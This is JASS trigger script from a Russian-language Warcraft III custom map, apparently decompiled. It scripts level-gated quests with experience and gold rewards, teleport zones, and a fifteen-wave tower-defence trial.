function BRi takes nothing returns nothing
if BRh() then
call DisableTrigger(GetTriggeringTrigger())
call CreateItemLoc($4930475A,GetUnitLoc(GetTriggerUnit()))
call DestroyEffectBJ(Us[36])
call QuestSetCompletedBJ(YX[36],true)
call DestroyQuest(YX[36])
set Th=GetUnitsInRectMatching(GetPlayableMapRect(),Condition(function BRd))
call ForGroupBJ(Th,function BRf)
call DestroyGroup(Th)
set Sf=Sf+1
call DisableTrigger(GetTriggeringTrigger())
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_COMPLETED,"|c00FF7F00Задание выполнено!|r Награда: |c00FF00FF3500 опыта|r, |c00ffff00400 золота|r, |c00ff969650 Кровавых Меток")
set bj_forLoopBIndex=1
set bj_forLoopBIndexEnd=8
loop
exitwhen bj_forLoopBIndex>bj_forLoopBIndexEnd
if BRg() then
set NJ[GetForLoopIndexB()]=NJ[GetForLoopIndexB()]+1200
set NK[GetForLoopIndexB()]=NK[GetForLoopIndexB()]+150
else
endif
set bj_forLoopBIndex=bj_forLoopBIndex+1
endloop
else
call ne(GetTriggerUnit(),"Задание с |c00ff000025|r уровня",.027,255,255,255)
endif
endfunction
function BRj takes nothing returns nothing
set bF=CreateTrigger()
call DisableTrigger(bF)
call TriggerRegisterAnyUnitEventBJ(bF,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(bF,Condition(function BRY))
call TriggerAddAction(bF,function BRi)
endfunction
function BRk takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$486C6772) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BRl takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=43) then
return false
endif
return true
endfunction
function BRm takes nothing returns nothing
if BRl() then
call DisableTrigger(GetTriggeringTrigger())
call DestroyEffectBJ(Us[37])
call AddSpecialEffectTargetUnitBJ("overhead",Kc,"war3mapImported\\QuestYellow1_Portrait.mdx")
set Us[37]=GetLastCreatedEffectBJ()
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_DISCOVERED,"|cffffcc00Задание получено:|r \"Смерть\".")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c006969FFУровень задания: 43-50|r
")
call CreateQuestBJ(bj_QUESTTYPE_OPT_DISCOVERED,"Смерть","Убить Смерть? Говорили, что это нереально. А Вам по силам?
|c006969FFУровень задания: 43-50|r","ReplaceableTextures\\CommandButtons\\BTNAmbush.blp")
set YX[37]=GetLastCreatedQuestBJ()
else
call ne(GetTriggerUnit(),"Задание с |c00ff000043|r уровня",.027,255,255,255)
endif
endfunction
function BRn takes nothing returns nothing
set bG=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(bG,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(bG,Condition(function BRk))
call TriggerAddAction(bG,function BRm)
endfunction
function BRo takes nothing returns nothing
call EnableTrigger(bI)
call DisableTrigger(bG)
call DestroyEffectBJ(Us[37])
call AddSpecialEffectTargetUnitBJ("overhead",Kc,"war3mapImported\\QuestYellow1.mdx")
set Us[37]=GetLastCreatedEffectBJ()
endfunction
function BRp takes nothing returns nothing
set bH=CreateTrigger()
call TriggerRegisterUnitEvent(bH,K8,EVENT_UNIT_DEATH)
call TriggerAddAction(bH,function BRo)
endfunction
function BRq takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$486C6772) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BRr takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BRs takes nothing returns boolean
return GetPlayerController(GetOwningPlayer(GetFilterUnit()))==MAP_CONTROL_USER
endfunction
function BRt takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$48303457
endfunction
function BRu takes nothing returns boolean
return GetBooleanAnd(BRs(),BRt())
endfunction
function BRv takes nothing returns boolean
return GetBooleanAnd(BRr(),BRu())
endfunction
function BRw takes nothing returns boolean
if not (GetUnitLevel(GetEnumUnit())>=43) then
return false
endif
if not (GetUnitLevel(GetEnumUnit())<=49) then
return false
endif
return true
endfunction
function BRx takes nothing returns nothing
if BRw() then
call AddHeroXP(GetEnumUnit(),4600,false)
set TI[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]=TI[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]+67000
else
endif
endfunction
function BRy takes nothing returns boolean
if not (GetUnitLevel(MT[GetForLoopIndexB()-1])>=43) then
return false
endif
return true
endfunction
function BRz takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=43) then
return false
endif
return true
endfunction
function BR0 takes nothing returns nothing
if BRz() then
call DisableTrigger(GetTriggeringTrigger())
call UnitAddAbilityBJ($41706974,GetOrderTargetUnit())
call UnitAddAbilityBJ($416E6532,GetOrderTargetUnit())
call CreateItemLoc($49305732,GetUnitLoc(GetTriggerUnit()))
call DestroyEffectBJ(Us[37])
call QuestSetCompletedBJ(YX[37],true)
call DestroyQuest(YX[37])
set Th=GetUnitsInRectMatching(GetPlayableMapRect(),Condition(function BRv))
call ForGroupBJ(Th,function BRx)
call DestroyGroup(Th)
set Sf=Sf+1
call DisableTrigger(GetTriggeringTrigger())
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_COMPLETED,"|c00FF7F00Задание выполнено!|r Награда: |c00FF00FF6700 опыта|r, |c00ffff00400 золота|r, |c00ff969620 Кровавых Меток")
set bj_forLoopBIndex=1
set bj_forLoopBIndexEnd=8
loop
exitwhen bj_forLoopBIndex>bj_forLoopBIndexEnd
if BRy() then
set NJ[GetForLoopIndexB()]=NJ[GetForLoopIndexB()]+1200
set NK[GetForLoopIndexB()]=NK[GetForLoopIndexB()]+60
else
endif
set bj_forLoopBIndex=bj_forLoopBIndex+1
endloop
else
call ne(GetTriggerUnit(),"Задание с |c00ff000043|r уровня",.027,255,255,255)
endif
endfunction
function BR1 takes nothing returns nothing
set bI=CreateTrigger()
call DisableTrigger(bI)
call TriggerRegisterAnyUnitEventBJ(bI,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(bI,Condition(function BRq))
call TriggerAddAction(bI,function BR0)
endfunction
function BR2 takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$4864676F) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BR3 takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=25) then
return false
endif
return true
endfunction
function BR4 takes nothing returns nothing
if BR3() then
call DisableTrigger(GetTriggeringTrigger())
call DestroyEffectBJ(Us[39])
call AddSpecialEffectTargetUnitBJ("overhead",Kb,"war3mapImported\\QuestYellow1_Portrait.mdx")
set Us[39]=GetLastCreatedEffectBJ()
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_DISCOVERED,"|cffffcc00Задание получено:|r \"Захватите пуховики\".")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c006969FFУровень задания: 25+|r
")
call CreateQuestBJ(bj_QUESTTYPE_OPT_DISCOVERED,"Захватите пуховики","|c006969FFУровень задания: 25+|r
Не окажете услугу? Вы когда-то замерзали? Насмерть? Так вот, туда, куда я попрошу пойти, оооочень холодно. Ваша задача достаточно банальна: убить Морина. Не беспокойтесь, он никуда не уйдет и будет ждать вас до последнего","ReplaceableTextures\\CommandButtons\\BTNAmbush.blp")
set YX[38]=GetLastCreatedQuestBJ()
else
call ne(GetTriggerUnit(),"Задание с |c00ff000025|r уровня",.027,255,255,255)
endif
endfunction
function BR5 takes nothing returns nothing
set bJ=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(bJ,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(bJ,Condition(function BR2))
call TriggerAddAction(bJ,function BR4)
endfunction
function BR6 takes nothing returns nothing
call ShowUnitShow(Lx)
call PauseUnit(Lx,false)
endfunction
function BR7 takes nothing returns nothing
set bK=CreateTrigger()
call TriggerRegisterUnitEvent(bK,Lv,EVENT_UNIT_DEATH)
call TriggerAddAction(bK,function BR6)
endfunction
function BR8 takes nothing returns nothing
call EnableTrigger(Vj)
endfunction
function BR9 takes nothing returns nothing
set bL=CreateTrigger()
call TriggerRegisterUnitEvent(bL,Lx,EVENT_UNIT_DEATH)
call TriggerAddAction(bL,function BR8)
endfunction
function BSB takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function BSC takes nothing returns nothing
local integer L9=0
call SetUnitPositionLoc(GetTriggerUnit(),GetRectCenter(Do))
call PanCameraToTimedLocForPlayer(GetOwningPlayer(GetEnteringUnit()),GetRectCenter(Do),0)
call SetUnitLifePercentBJ(Lw,100)
call SetUnitLifePercentBJ(Vd[5],100)
call SaveInteger(NY,GetHandleId(Vd[5]),1,0)
call SaveInteger(NY,GetHandleId(Lw),1,0)
loop
call SaveInteger(NY,GetHandleId(Lw),2+L9,0)
call SaveInteger(NY,GetHandleId(Vd[5]),2+L9,0)
set L9=L9+1
exitwhen L9==7
endloop
endfunction
function BSD takes nothing returns nothing
set Vj=CreateTrigger()
call DisableTrigger(Vj)
call TriggerRegisterEnterRectSimple(Vj,Dn)
call TriggerAddCondition(Vj,Condition(function BSB))
call TriggerAddAction(Vj,function BSC)
endfunction
function BSE takes nothing returns nothing
call DisableTrigger(Vj)
call EnableTrigger(bN)
call EnableTrigger(bO)
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"Морин погиб. Я жду Вас, Герои")
call DestroyEffectBJ(Us[39])
call AddSpecialEffectTargetUnitBJ("overhead",Kb,"war3mapImported\\QuestYellow1.mdx")
set Us[39]=GetLastCreatedEffectBJ()
endfunction
function BSF takes nothing returns nothing
set bM=CreateTrigger()
call TriggerRegisterUnitEvent(bM,Lw,EVENT_UNIT_DEATH)
call TriggerAddAction(bM,function BSE)
endfunction
function BSG takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function BSH takes nothing returns nothing
set V0=Location(5520.,320.)
call SetUnitPositionLoc(GetTriggerUnit(),V0)
call PanCameraToTimedLocForPlayer(GetOwningPlayer(GetEnteringUnit()),V0,0)
call RemoveLocation(V0)
endfunction
function BSI takes nothing returns nothing
set bN=CreateTrigger()
call DisableTrigger(bN)
call TriggerRegisterEnterRectSimple(bN,Dp)
call TriggerAddCondition(bN,Condition(function BSG))
call TriggerAddAction(bN,function BSH)
endfunction
function BSJ takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$4864676F) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BSK takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BSL takes nothing returns boolean
return GetPlayerController(GetOwningPlayer(GetFilterUnit()))==MAP_CONTROL_USER
endfunction
function BSM takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$48303457
endfunction
function BSN takes nothing returns boolean
return GetBooleanAnd(BSL(),BSM())
endfunction
function BSO takes nothing returns boolean
return GetBooleanAnd(BSK(),BSN())
endfunction
function BSP takes nothing returns boolean
if not (GetUnitLevel(GetEnumUnit())>=25) then
return false
endif
return true
endfunction
function BSQ takes nothing returns nothing
if BSP() then
call AddHeroXP(GetEnumUnit(),3000,false)
set TI[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]=TI[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]+3000
else
endif
endfunction
function BSR takes nothing returns boolean
if not (GetUnitLevel(MT[GetForLoopIndexB()-1])>=25) then
return false
endif
return true
endfunction
function BSS takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=25) then
return false
endif
return true
endfunction
function BST takes nothing returns nothing
if BSS() then
call DisableTrigger(GetTriggeringTrigger())
call UnitAddAbilityBJ($41706974,Kb)
call UnitAddAbilityBJ($416E6532,GetOrderTargetUnit())
call DestroyEffectBJ(Us[39])
call QuestSetCompletedBJ(YX[38],true)
call DestroyQuest(YX[38])
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"Теперь я могу продать Вам могущественные |c00ff00ffТалисманы|r. Но чтобы их улучшить, прийдется хорошо полазить по миру, розглядывая всё вокруг. Подскажу одно: обычного ")
set Th=GetUnitsInRectMatching(GetPlayableMapRect(),Condition(function BSO))
call ForGroupBJ(Th,function BSQ)
call DestroyGroup(Th)
set Sf=Sf+1
call DisableTrigger(GetTriggeringTrigger())
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_COMPLETED,"|c00FF7F00Задание выполнено!|r Награда: |c00FF00FF3000 опыта|r, |c00ffff00400 золота|r, |c00ff969625 Кровавых Меток")
set bj_forLoopBIndex=1
set bj_forLoopBIndexEnd=8
loop
exitwhen bj_forLoopBIndex>bj_forLoopBIndexEnd
if BSR() then
set NJ[GetForLoopIndexB()]=NJ[GetForLoopIndexB()]+1200
set NK[GetForLoopIndexB()]=NK[GetForLoopIndexB()]+75
else
endif
set bj_forLoopBIndex=bj_forLoopBIndex+1
endloop
else
call ne(GetTriggerUnit(),"Задание с |c00ff000025|r уровня",.027,255,255,255)
endif
endfunction
function BSU takes nothing returns nothing
set bO=CreateTrigger()
call DisableTrigger(bO)
call TriggerRegisterAnyUnitEventBJ(bO,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(bO,Condition(function BSJ))
call TriggerAddAction(bO,function BST)
endfunction
function BSV takes nothing returns boolean
if not (UnitHasItemOfTypeBJ(GetTriggerUnit(),$49304833)==true) then
return false
endif
return true
endfunction
function BSW takes nothing returns nothing
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c006969FFУровень задания: 25+|r
Пройдите испытание, и получите награду. Всё просто! Если готовы, то вперед!!!
|c00ff7f00(чтобы попасть в локацию испытания, кликните на Мишку)")
call DisableTrigger(GetTriggeringTrigger())
call EnableTrigger(bQ)
endfunction
function BSX takes nothing returns nothing
set bP=CreateTrigger()
call TriggerRegisterEnterRectSimple(bP,Dz)
call TriggerAddCondition(bP,Condition(function BSV))
call TriggerAddAction(bP,function BSW)
endfunction
function BSY takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BSZ takes nothing returns nothing
call SetUnitPositionLoc(GetEnumUnit(),GetRectCenter(Dx))
endfunction
function BSa takes nothing returns nothing
call ForGroupBJ(GetUnitsInRectMatching(Dz,Condition(function BSY)),function BSZ)
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c0000ff00Кликните на башню для того, чтобы начать испытание.")
endfunction
function BSb takes nothing returns nothing
set bQ=CreateTrigger()
call DisableTrigger(bQ)
call TriggerRegisterUnitEvent(bQ,I4,EVENT_UNIT_SELECTED)
call TriggerAddAction(bQ,function BSa)
endfunction
function BSc takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function BSd takes nothing returns nothing
call SetUnitPositionLoc(GetTriggerUnit(),GetRectCenter(Dz))
endfunction
function BSe takes nothing returns nothing
set bR=CreateTrigger()
call DisableTrigger(bR)
call TriggerRegisterEnterRectSimple(bR,Dy)
call TriggerAddCondition(bR,Condition(function BSc))
call TriggerAddAction(bR,function BSd)
endfunction
function BSf takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function BSg takes nothing returns nothing
call IssuePointOrderLocBJ(GetEnumUnit(),"patrol",GetRectCenter(Dx))
endfunction
function BSh takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function BSi takes nothing returns nothing
call IssuePointOrderLocBJ(GetEnumUnit(),"patrol",GetRectCenter(Dx))
endfunction
function BSj takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function BSk takes nothing returns nothing
call IssuePointOrderLocBJ(GetEnumUnit(),"patrol",GetRectCenter(Dx))
endfunction
function BSl takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function BSm takes nothing returns nothing
call IssuePointOrderLocBJ(GetEnumUnit(),"patrol",GetRectCenter(Dx))
endfunction
function BSn takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function BSo takes nothing returns nothing
call IssuePointOrderLocBJ(GetEnumUnit(),"patrol",GetRectCenter(Dx))
endfunction
function BSp takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function BSq takes nothing returns nothing
call IssuePointOrderLocBJ(GetEnumUnit(),"patrol",GetRectCenter(Dx))
endfunction
function BSr takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function BSs takes nothing returns nothing
call IssuePointOrderLocBJ(GetEnumUnit(),"patrol",GetRectCenter(Dx))
endfunction
function BSt takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function BSu takes nothing returns nothing
call IssuePointOrderLocBJ(GetEnumUnit(),"patrol",GetRectCenter(Dx))
endfunction
function BSv takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function BSw takes nothing returns nothing
call IssuePointOrderLocBJ(GetEnumUnit(),"patrol",GetRectCenter(Dx))
endfunction
function BSx takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function BSy takes nothing returns nothing
call IssuePointOrderLocBJ(GetEnumUnit(),"patrol",GetRectCenter(Dx))
endfunction
function BSz takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function BS0 takes nothing returns nothing
call IssuePointOrderLocBJ(GetEnumUnit(),"patrol",GetRectCenter(Dx))
endfunction
function BS1 takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function BS2 takes nothing returns nothing
call IssuePointOrderLocBJ(GetEnumUnit(),"patrol",GetRectCenter(Dx))
endfunction
function BS3 takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function BS4 takes nothing returns nothing
call IssuePointOrderLocBJ(GetEnumUnit(),"patrol",GetRectCenter(Dx))
endfunction
function BS5 takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function BS6 takes nothing returns nothing
call IssuePointOrderLocBJ(GetEnumUnit(),"patrol",GetRectCenter(Dx))
endfunction
function BS7 takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function BS8 takes nothing returns nothing
call IssuePointOrderLocBJ(GetEnumUnit(),"patrol",GetRectCenter(Dx))
endfunction
function BS9 takes nothing returns boolean
if not (IsUnitAliveBJ(Jl)==true) then
return false
endif
return true
endfunction
function BTB takes nothing returns boolean
if not (IsUnitAliveBJ(Jl)==true) then
return false
endif
return true
endfunction
function BTC takes nothing returns boolean
if not (IsUnitAliveBJ(Jl)==true) then
return false
endif
return true
endfunction
function BTD takes nothing returns boolean
if not (IsUnitAliveBJ(Jl)==true) then
return false
endif
return true
endfunction
function BTE takes nothing returns boolean
if not (IsUnitAliveBJ(Jl)==true) then
return false
endif
return true
endfunction
function BTF takes nothing returns boolean
if not (IsUnitAliveBJ(Jl)==true) then
return false
endif
return true
endfunction
function BTG takes nothing returns boolean
if not (IsUnitAliveBJ(Jl)==true) then
return false
endif
return true
endfunction
function BTH takes nothing returns boolean
if not (IsUnitAliveBJ(Jl)==true) then
return false
endif
return true
endfunction
function BTI takes nothing returns boolean
if not (IsUnitAliveBJ(Jl)==true) then
return false
endif
return true
endfunction
function BTJ takes nothing returns boolean
if not (IsUnitAliveBJ(Jl)==true) then
return false
endif
return true
endfunction
function BTK takes nothing returns boolean
if not (IsUnitAliveBJ(Jl)==true) then
return false
endif
return true
endfunction
function BTL takes nothing returns boolean
if not (IsUnitAliveBJ(Jl)==true) then
return false
endif
return true
endfunction
function BTM takes nothing returns boolean
if not (IsUnitAliveBJ(Jl)==true) then
return false
endif
return true
endfunction
function BTN takes nothing returns boolean
if not (IsUnitAliveBJ(Jl)==true) then
return false
endif
return true
endfunction
function BTO takes nothing returns boolean
if not (IsUnitAliveBJ(Jl)==true) then
return false
endif
return true
endfunction
function BTP takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call SetUnitOwner(GetTriggerUnit(),Player(8),true)
call TriggerSleepAction(15.)
set V0=GetRectCenter(Dw)
call DisplayTextToForce(GetPlayersAll(),"Волна: |c00ff00ff1/15")
call CreateNUnitsAtLoc(15,$6E303030,Player(10),V0,bj_UNIT_FACING)
call ForGroupBJ(GetUnitsInRectMatching(Dw,Condition(function BSf)),function BSg)
call IssuePointOrderLoc(GetLastCreatedUnit(),"attack",GetRectCenter(Dx))
call RemoveLocation(V0)
call TriggerSleepAction(20.)
if BTO() then
set V0=GetRectCenter(Dw)
call DisplayTextToForce(GetPlayersAll(),"Волна: |c00ff00ff2/15")
call CreateNUnitsAtLoc(15,$6E303046,Player(10),V0,bj_UNIT_FACING)
call ForGroupBJ(GetUnitsInRectMatching(Dw,Condition(function BSh)),function BSi)
call RemoveLocation(V0)
call TriggerSleepAction(20.)
if BTN() then
set V0=GetRectCenter(Dw)
call DisplayTextToForce(GetPlayersAll(),"Волна: |c00ff00ff3/15")
call CreateNUnitsAtLoc(15,$6E303044,Player(10),V0,bj_UNIT_FACING)
call ForGroupBJ(GetUnitsInRectMatching(Dw,Condition(function BSj)),function BSk)
call IssuePointOrderLoc(GetLastCreatedUnit(),"attack",GetRectCenter(Dx))
call RemoveLocation(V0)
call TriggerSleepAction(20.)
if BTM() then
set V0=GetRectCenter(Dw)
call DisplayTextToForce(GetPlayersAll(),"Волна: |c00ff00ff4/15")
call CreateNUnitsAtLoc(15,$6E303045,Player(10),V0,bj_UNIT_FACING)
call ForGroupBJ(GetUnitsInRectMatching(Dw,Condition(function BSl)),function BSm)
call IssuePointOrderLoc(GetLastCreatedUnit(),"attack",GetRectCenter(Dx))
call RemoveLocation(V0)
call TriggerSleepAction(20.)
if BTL() then
set V0=GetRectCenter(Dw)
call DisplayTextToForce(GetPlayersAll(),"Волна: |c00ff00ff5/15")
call CreateNUnitsAtLoc(4,$6E30334D,Player(10),V0,bj_UNIT_FACING)
call ForGroupBJ(GetUnitsInRectMatching(Dw,Condition(function BSn)),function BSo)
call IssuePointOrderLoc(GetLastCreatedUnit(),"attack",GetRectCenter(Dx))
call RemoveLocation(V0)
call TriggerSleepAction(35.)
if BTK() then
set V0=GetRectCenter(Dw)
call DisplayTextToForce(GetPlayersAll(),"Волна: |c00ff00ff6/15")
call CreateNUnitsAtLoc(15,$6E73626D,Player(10),V0,bj_UNIT_FACING)
call ForGroupBJ(GetUnitsInRectMatching(Dw,Condition(function BSp)),function BSq)
call IssuePointOrderLoc(GetLastCreatedUnit(),"attack",GetRectCenter(Dx))
call RemoveLocation(V0)
call TriggerSleepAction(20.)
if BTJ() then
set V0=GetRectCenter(Dw)
call DisplayTextToForce(GetPlayersAll(),"Волна: |c00ff00ff7/15")
call CreateNUnitsAtLoc(15,$6E303047,Player(10),V0,bj_UNIT_FACING)
call ForGroupBJ(GetUnitsInRectMatching(Dw,Condition(function BSr)),function BSs)
call IssuePointOrderLoc(GetLastCreatedUnit(),"attack",GetRectCenter(Dx))
call RemoveLocation(V0)
call TriggerSleepAction(20.)
if BTI() then
set V0=GetRectCenter(Dw)
call DisplayTextToForce(GetPlayersAll(),"Волна: |c00ff00ff8/15")
call CreateNUnitsAtLoc(15,$6E677277,Player(10),V0,bj_UNIT_FACING)
call ForGroupBJ(GetUnitsInRectMatching(Dw,Condition(function BSt)),function BSu)
call IssuePointOrderLoc(GetLastCreatedUnit(),"attack",GetRectCenter(Dx))
call RemoveLocation(V0)
call TriggerSleepAction(20.)
if BTH() then
set V0=GetRectCenter(Dw)
call DisplayTextToForce(GetPlayersAll(),"Волна: |c00ff00ff9/15")
call CreateNUnitsAtLoc(15,$6E627A6B,Player(10),V0,bj_UNIT_FACING)
call ForGroupBJ(GetUnitsInRectMatching(Dw,Condition(function BSv)),function BSw)
call IssuePointOrderLoc(GetLastCreatedUnit(),"attack",GetRectCenter(Dx))
call RemoveLocation(V0)
call TriggerSleepAction(20.)
if BTG() then
set V0=GetRectCenter(Dw)
call DisplayTextToForce(GetPlayersAll(),"Волна: |c00ff00ff10/15")
call CreateNUnitsAtLoc(4,$6E30334F,Player(10),V0,bj_UNIT_FACING)
call ForGroupBJ(GetUnitsInRectMatching(Dw,Condition(function BSx)),function BSy)
call IssuePointOrderLoc(GetLastCreatedUnit(),"attack",GetRectCenter(Dx))
call RemoveLocation(V0)
call TriggerSleepAction(35.)
if BTF() then
set V0=GetRectCenter(Dw)
call DisplayTextToForce(GetPlayersAll(),"Волна: |c00ff00ff11/15")
call CreateNUnitsAtLoc(3,$6E30324E,Player(10),V0,bj_UNIT_FACING)
call ForGroupBJ(GetUnitsInRectMatching(Dw,Condition(function BSz)),function BS0)
call IssuePointOrderLoc(GetLastCreatedUnit(),"attack",GetRectCenter(Dx))
call RemoveLocation(V0)
call TriggerSleepAction(40.)
if BTE() then
set V0=GetRectCenter(Dw)
call DisplayTextToForce(GetPlayersAll(),"Волна: |c00ff00ff12/15")
call CreateNUnitsAtLoc(15,$6E6A6762,Player(10),V0,bj_UNIT_FACING)
call ForGroupBJ(GetUnitsInRectMatching(Dw,Condition(function BS1)),function BS2)
call IssuePointOrderLoc(GetLastCreatedUnit(),"attack",GetRectCenter(Dx))
call RemoveLocation(V0)
call TriggerSleepAction(40.)
if BTD() then
set V0=GetRectCenter(Dw)
call DisplayTextToForce(GetPlayersAll(),"Волна: |c00ff00ff13/15")
call CreateNUnitsAtLoc(3,$6E303351,Player(10),V0,bj_UNIT_FACING)
call ForGroupBJ(GetUnitsInRectMatching(Dw,Condition(function BS3)),function BS4)
call IssuePointOrderLoc(GetLastCreatedUnit(),"attack",GetRectCenter(Dx))
call RemoveLocation(V0)
call TriggerSleepAction(35.)
if BTC() then
set V0=GetRectCenter(Dw)
call DisplayTextToForce(GetPlayersAll(),"Волна: |c00ff00ff14/15")
call CreateNUnitsAtLoc(15,$6E737277,Player(10),V0,bj_UNIT_FACING)
call ForGroupBJ(GetUnitsInRectMatching(Dw,Condition(function BS5)),function BS6)
call IssuePointOrderLoc(GetLastCreatedUnit(),"attack",GetRectCenter(Dx))
call RemoveLocation(V0)
call TriggerSleepAction(35.)
if BTB() then
set V0=GetRectCenter(Dw)
call DisplayTextToForce(GetPlayersAll(),"Волна: |c00ff00ff15/15")
call CreateNUnitsAtLoc(4,$6E303057,Player(10),V0,bj_UNIT_FACING)
call ForGroupBJ(GetUnitsInRectMatching(Dw,Condition(function BS7)),function BS8)
call IssuePointOrderLoc(GetLastCreatedUnit(),"attack",GetRectCenter(Dx))
call RemoveLocation(V0)
call DisplayTextToForce(GetPlayersAll(),"Если в течении 120 секунд Башня погибнет, испытание провалено!")
call TriggerSleepAction(120.)
if BS9() then
call EnableTrigger(bR)
call DisableTrigger(bQ)
call DisplayTextToForce(GetPlayersAll(),"Поздравляю Вас! Получите Вашу награду!")
call CreateItemLoc($49304957,GetRectCenter(Dw))
else
call DisplayTextToForce(GetPlayersAll(),"|c00ff0000Испытание Провалено!")
endif
else
call DisplayTextToForce(GetPlayersAll(),"|c00ff0000Испытание Провалено!")
endif
else
call DisplayTextToForce(GetPlayersAll(),"|c00ff0000Испытание Провалено!")
endif
else
call DisplayTextToForce(GetPlayersAll(),"|c00ff0000Испытание Провалено!")
endif
else
call DisplayTextToForce(GetPlayersAll(),"|c00ff0000Испытание Провалено!")
endif
else
call DisplayTextToForce(GetPlayersAll(),"|c00ff0000Испытание Провалено!")
endif
else
call DisplayTextToForce(GetPlayersAll(),"|c00ff0000Испытание Провалено!")
endif
else
call DisplayTextToForce(GetPlayersAll(),"|c00ff0000Испытание Провалено!")
endif
else
call DisplayTextToForce(GetPlayersAll(),"|c00ff0000Испытание Провалено!")
endif
else
call DisplayTextToForce(GetPlayersAll(),"|c00ff0000Испытание Провалено!")
endif
else
call DisplayTextToForce(GetPlayersAll(),"|c00ff0000Испытание Провалено!")
endif
else
call DisplayTextToForce(GetPlayersAll(),"|c00ff0000Испытание Провалено!")
endif
else
call DisplayTextToForce(GetPlayersAll(),"|c00ff0000Испытание Провалено!")
endif
else
call DisplayTextToForce(GetPlayersAll(),"|c00ff0000Испытание Провалено!")
endif
else
call DisplayTextToForce(GetPlayersAll(),"|c00ff0000Испытание Провалено!")
endif
endfunction
function BTQ takes nothing returns nothing
set bS=CreateTrigger()
call TriggerRegisterUnitEvent(bS,Jl,EVENT_UNIT_SELECTED)
call TriggerAddAction(bS,function BTP)
endfunction
function BTR takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$4867616D) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
